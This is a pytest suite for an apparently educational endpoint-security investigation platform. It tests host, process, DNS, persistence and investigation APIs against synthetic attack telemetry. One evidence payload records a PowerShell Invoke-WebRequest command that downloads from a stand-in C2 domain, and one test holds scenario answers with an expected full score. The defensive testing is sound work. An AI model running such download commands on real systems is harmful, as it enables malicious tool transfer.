"""Comprehensive test suite for Step 16 Endpoint Security & Host Investigation Engine."""

import uuid

import pytest
from app.db.session import SessionLocal
from app.main import app
from app.models.endpoint_security import (
    EndpointEvent,
    EndpointHost,
    EndpointInvestigation,
)
from app.models.enums import UserRole
from app.models.user import User
from app.services.endpoint_security.dataset_service import DatasetService
from fastapi.testclient import TestClient
from sqlalchemy import select
from sqlalchemy.orm import Session

client = TestClient(app)


@pytest.fixture
def db_session():
    """Database session fixture."""
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


@pytest.fixture(autouse=True)
def ensure_endpoint_data(db_session: Session):
    """Ensure synthetic hosts, events, and scenarios exist before tests run."""
    host = db_session.execute(select(EndpointHost)).first()
    if not host:
        DatasetService.seed_data(db_session)


def test_list_hosts():
    """Verify hosts listing with platform and search filters."""
    # All hosts
    resp = client.get("/api/v1/endpoint-security/hosts")
    assert resp.status_code == 200
    data = resp.json()
    assert data["total"] >= 4
    hostnames = [h["hostname"] for h in data["items"]]
    assert "NN-WIN-001" in hostnames
    assert "NN-LINUX-001" in hostnames

    # Filter by platform
    resp_win = client.get("/api/v1/endpoint-security/hosts?platform=WINDOWS")
    assert resp_win.status_code == 200
    for h in resp_win.json()["items"]:
        assert h["platform"] == "WINDOWS"

    # Search filter
    resp_search = client.get("/api/v1/endpoint-security/hosts?search=Bastion")
    assert resp_search.status_code == 200
    assert len(resp_search.json()["items"]) >= 1
    assert resp_search.json()["items"][0]["hostname"] == "NN-LINUX-001"


def test_get_host_by_id_and_stable_id(db_session: Session):
    """Verify host lookup by integer ID and stable string identifier."""
    host = db_session.execute(
        select(EndpointHost).where(EndpointHost.stable_id == "HOST-WIN-001")
    ).scalar_one()

    # By numeric ID
    resp_num = client.get(f"/api/v1/endpoint-security/hosts/{host.id}")
    assert resp_num.status_code == 200
    assert resp_num.json()["stable_id"] == "HOST-WIN-001"

    # By stable string ID
    resp_str = client.get("/api/v1/endpoint-security/hosts/HOST-WIN-001")
    assert resp_str.status_code == 200
    assert resp_str.json()["hostname"] == "NN-WIN-001"


def test_host_overview():
    """Verify aggregated telemetry overview for a host."""
    resp = client.get("/api/v1/endpoint-security/hosts/HOST-WIN-002/overview")
    assert resp.status_code == 200
    data = resp.json()

    # Metrics
    assert "metrics" in data
    assert data["metrics"]["total_events"] >= 8
    assert data["metrics"]["processes_count"] >= 1
    assert data["metrics"]["network_connections_count"] >= 1
    assert data["metrics"]["dns_queries_count"] >= 1

    # Observed entities
    assert "observed_entities" in data
    assert "bob.developer" in data["observed_entities"]["users"]
    assert "malicious-c2.training.test" in data["observed_entities"]["domains"]


def test_host_events_filters():
    """Verify event queries with category, severity, and text search."""
    resp = client.get(
        "/api/v1/endpoint-security/hosts/HOST-WIN-002/events?event_category=PROCESS"
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["total"] >= 2
    for item in data["items"]:
        assert item["event_category"] == "PROCESS"

    # Search filter
    resp_search = client.get(
        "/api/v1/endpoint-security/hosts/HOST-WIN-002/events?search=Bypass"
    )
    assert resp_search.status_code == 200
    assert resp_search.json()["total"] >= 1
    assert "powershell.exe" in resp_search.json()["items"][0]["process_name"]


def test_process_tree():
    """Verify hierarchical process tree construction."""
    resp = client.get("/api/v1/endpoint-security/hosts/HOST-WIN-002/processes")
    assert resp.status_code == 200
    tree = resp.json()
    assert len(tree) >= 1

    # Find powershell or explorer
    pids = [n["process_id"] for n in tree]
    assert 4050 in pids or any(4050 in [c["process_id"] for c in n["children"]] for n in tree)


def test_process_details():
    """Verify detailed process telemetry including children and network activity."""
    # Process 4050 is powershell.exe on NN-WIN-002
    resp = client.get("/api/v1/endpoint-security/hosts/HOST-WIN-002/processes/4050")
    assert resp.status_code == 200
    data = resp.json()

    assert data["process"]["process_name"] == "powershell.exe"
    assert data["process"]["integrity_level"] == "STANDARD"

    # Children
    assert len(data["children"]) >= 1
    child_names = [c["process_name"] for c in data["children"]]
    assert "update.exe" in child_names

    # Correlated network activity
    assert len(data["network_activity"]) >= 1
    assert data["network_activity"][0]["destination_ip"] == "198.51.100.45"

    # Correlated DNS activity
    assert len(data["dns_activity"]) >= 1
    assert data["dns_activity"][0]["domain"] == "malicious-c2.training.test"


def test_authentication_pattern_detection():
    """Verify authentication events and educational pattern recognition."""
    resp = client.get("/api/v1/endpoint-security/hosts/HOST-WIN-002/authentication")
    assert resp.status_code == 200
    data = resp.json()
    assert data["summary"]["failed_logins"] >= 3
    assert data["summary"]["successful_logins"] >= 1

    pattern = data["summary"]["pattern_analysis"]
    assert pattern is not None
    assert "Pattern requiring investigation" in pattern["label"]


def test_network_and_dns_telemetry():
    """Verify dedicated network and DNS query endpoints."""
    # Network
    net_resp = client.get("/api/v1/endpoint-security/hosts/HOST-WIN-002/network")
    assert net_resp.status_code == 200
    assert net_resp.json()["total"] >= 1
    assert net_resp.json()["items"][0]["destination_ip"] == "198.51.100.45"

    # DNS
    dns_resp = client.get("/api/v1/endpoint-security/hosts/HOST-WIN-002/dns")
    assert dns_resp.status_code == 200
    assert dns_resp.json()["total"] >= 1
    assert "training.test" in dns_resp.json()["items"][0]["domain"]


def test_files_and_services_telemetry():
    """Verify dedicated file and service telemetry endpoints."""
    # Files
    file_resp = client.get("/api/v1/endpoint-security/hosts/HOST-WIN-002/files")
    assert file_resp.status_code == 200
    assert file_resp.json()["total"] >= 1
    assert "update.exe" in file_resp.json()["items"][0]["file_name"]

    # Services
    srv_resp = client.get("/api/v1/endpoint-security/hosts/HOST-SRV-001/services")
    assert srv_resp.status_code == 200
    assert srv_resp.json()["total"] >= 1
    assert "NN-Diagnostic-Agent" in srv_resp.json()["items"][0]["service_name"]


def test_persistence_and_privileges_telemetry():
    """Verify persistence indicators and privilege events."""
    # Persistence
    pers_resp = client.get("/api/v1/endpoint-security/hosts/HOST-WIN-002/persistence")
    assert pers_resp.status_code == 200
    assert pers_resp.json()["total"] >= 1
    assert pers_resp.json()["items"][0]["persistence_type"] == "SCHEDULED_TASK"

    # Privileges on Linux host
    priv_resp = client.get("/api/v1/endpoint-security/hosts/HOST-LINUX-001/privileges")
    assert priv_resp.status_code == 200
    assert priv_resp.json()["total"] >= 1


def test_host_timeline():
    """Verify chronological timeline retrieval."""
    resp = client.get("/api/v1/endpoint-security/hosts/HOST-LINUX-001/timeline")
    assert resp.status_code == 200
    events = resp.json()["items"]
    assert len(events) >= 5

    # Check ascending order
    timestamps = [e["timestamp"] for e in events]
    assert timestamps == sorted(timestamps)


def test_investigation_lifecycle(db_session: Session):
    """Verify full investigation case lifecycle, hypotheses, evidence, findings, and conclusion."""
    host = db_session.execute(
        select(EndpointHost).where(EndpointHost.stable_id == "HOST-WIN-002")
    ).scalar_one()

    # 1. Create Investigation
    inv_payload = {
        "host_id": host.id,
        "title": "Investigation: Suspicious Process Spawning on NN-WIN-002",
        "description": "Analyzing powershell.exe and update.exe execution.",
        "priority": "P2",
        "scenario_slug": "process-tree-investigation",
    }
    create_resp = client.post("/api/v1/endpoint-security/investigations", json=inv_payload)
    assert create_resp.status_code == 201
    inv_data = create_resp.json()
    inv_id = inv_data["id"]
    assert inv_data["stable_id"].startswith("EINV-")

    # 2. Add Hypothesis
    hyp_payload = {
        "statement": "An attacker used powershell to download and execute update.exe from an unauthorized server.",
        "status": "OPEN",
        "confidence": "MEDIUM",
        "analyst_notes": "Initial assessment based on command-line arguments.",
    }
    hyp_resp = client.post(
        f"/api/v1/endpoint-security/investigations/{inv_id}/hypotheses", json=hyp_payload
    )
    assert hyp_resp.status_code == 201
    hyp_id = hyp_resp.json()["id"]

    # 3. Update Hypothesis
    update_hyp_resp = client.patch(
        f"/api/v1/endpoint-security/investigations/{inv_id}/hypotheses/{hyp_id}",
        json={"status": "SUPPORTED", "confidence": "HIGH"},
    )
    assert update_hyp_resp.status_code == 200
    assert update_hyp_resp.json()["status"] == "SUPPORTED"

    # 4. Add Evidence
    ev_payload = {
        "title": "PowerShell Command Argument Evidence",
        "description": "Captured command contains Invoke-WebRequest pointing to malicious-c2.training.test",
        "evidence_type": "PROCESS",
        "relevance": "SUPPORTING",
        "hypothesis_id": hyp_id,
        "artifact_data": {"command": "Invoke-WebRequest -Uri http://malicious-c2.training.test"},
    }
    ev_resp = client.post(
        f"/api/v1/endpoint-security/investigations/{inv_id}/evidence", json=ev_payload
    )
    assert ev_resp.status_code == 201

    # 5. Add Finding
    finding_payload = {
        "title": "Ingress Tool Transfer & Command Execution",
        "narrative": "Adversary downloaded an unauthorized binary and established persistence via scheduled task.",
        "mitre_attack_id": "T1105",
        "severity": "HIGH",
    }
    finding_resp = client.post(
        f"/api/v1/endpoint-security/investigations/{inv_id}/findings", json=finding_payload
    )
    assert finding_resp.status_code == 201

    # 6. Submit Conclusion
    conclusion_payload = {
        "summary": "Confirmed compromise via unauthorized ingress tool transfer and beacon execution on developer workstation NN-WIN-002.",
        "verdict": "CONFIRMED_COMPROMISE",
        "lessons_learned": "Restrict PowerShell execution policies and block direct egress to RFC 5737 training ranges.",
    }
    conc_resp = client.post(
        f"/api/v1/endpoint-security/investigations/{inv_id}/conclusion", json=conclusion_payload
    )
    assert conc_resp.status_code == 200
    conc_data = conc_resp.json()
    assert conc_data["training_score"] >= 70
    assert conc_data["verdict"] == "CONFIRMED_COMPROMISE"

    # 7. Check finalized status
    detail_resp = client.get(f"/api/v1/endpoint-security/investigations/{inv_id}")
    assert detail_resp.status_code == 200
    assert detail_resp.json()["status"] == "COMPLETED"


def test_investigation_idor_protection(db_session: Session):
    """Verify students cannot view or edit investigations belonging to other users without authorization."""
    host = db_session.execute(select(EndpointHost)).scalars().first()

    # Create user B
    user_b = db_session.execute(select(User).where(User.username == "user_b_test")).scalars().first()
    if not user_b:
        user_b = User(
            username="user_b_test",
            email="user_b@example.test",
            password_hash="fakehashpassword123",
            role=UserRole.STUDENT,
        )
        db_session.add(user_b)
        db_session.commit()
        db_session.refresh(user_b)

    # Create investigation for user B directly in DB
    inv_b = EndpointInvestigation(
        stable_id=f"EINV-{uuid.uuid4().hex[:8].upper()}",
        host_id=host.id,
        user_id=user_b.id,
        title="User B Private Case",
        description="Confidential case.",
        status="OPEN",
        priority="P1",
    )
    db_session.add(inv_b)
    db_session.commit()
    db_session.refresh(inv_b)

    # Standard client executes as student_dev; accessing user_b's investigation must fail with 404
    resp = client.get(f"/api/v1/endpoint-security/investigations/{inv_b.id}")
    assert resp.status_code == 404


def test_pivots_threat_intel_and_hunt(db_session: Session):
    """Verify 1-click pivots into Threat Intelligence and Threat Hunting."""
    # Find event with domain
    event = db_session.execute(
        select(EndpointEvent).where(EndpointEvent.domain == "malicious-c2.training.test")
    ).scalars().first()

    # 1. Pivot to Intel
    intel_resp = client.post(f"/api/v1/endpoint-security/events/{event.event_id}/pivot-intel")
    assert intel_resp.status_code == 200
    intel_data = intel_resp.json()
    assert len(intel_data["observables"]) >= 1

    # 2. Start Threat Hunt
    hunt_resp = client.post(f"/api/v1/endpoint-security/events/{event.event_id}/start-hunt")
    assert hunt_resp.status_code == 200
    hunt_data = hunt_resp.json()
    assert hunt_data["hunt_id"].startswith("HUNT-")
    assert "redirect_url" in hunt_data


def test_pivot_soc_and_correlations(db_session: Session):
    """Verify 1-click pivot to SOC and cross-engine correlations."""
    event = db_session.execute(
        select(EndpointEvent).where(EndpointEvent.event_type == "PROCESS_START")
    ).scalars().first()

    # 1. Investigate in SOC
    soc_resp = client.post(f"/api/v1/endpoint-security/events/{event.event_id}/investigate-in-soc")
    assert soc_resp.status_code == 200
    soc_data = soc_resp.json()
    assert soc_data["investigation_id"].startswith("INV-")

    # 2. SIEM Correlation
    siem_resp = client.get(f"/api/v1/endpoint-security/events/{event.event_id}/correlate-siem")
    assert siem_resp.status_code == 200
    assert isinstance(siem_resp.json(), list)

    # 3. PCAP Correlation
    pcap_resp = client.get(f"/api/v1/endpoint-security/events/{event.event_id}/correlate-pcap")
    assert pcap_resp.status_code == 200
    assert isinstance(pcap_resp.json(), list)


def test_scenarios_and_validation():
    """Verify guided scenarios listing, details, and rubric grading."""
    # 1. List scenarios
    list_resp = client.get("/api/v1/endpoint-security/scenarios")
    assert list_resp.status_code == 200
    scenarios = list_resp.json()
    assert len(scenarios) >= 6

    # 2. Get scenario details
    slug = "failed-login-investigation"
    detail_resp = client.get(f"/api/v1/endpoint-security/scenarios/{slug}")
    assert detail_resp.status_code == 200
    assert len(detail_resp.json()["objectives"]) >= 3

    # 3. Validate student response
    validate_payload = {
        "answers": {
            "expected_user": "alice.johnson",
            "expected_failures": 1,
            "verdict": "BENIGN_ANOMALY",
            "source_ip": "192.0.2.15",
        }
    }
    val_resp = client.post(
        f"/api/v1/endpoint-security/scenarios/{slug}/validate", json=validate_payload
    )
    assert val_resp.status_code == 200
    val_data = val_resp.json()
    assert val_data["passed"] is True
    assert val_data["score"] == 100
    assert "criteria_met" in val_data
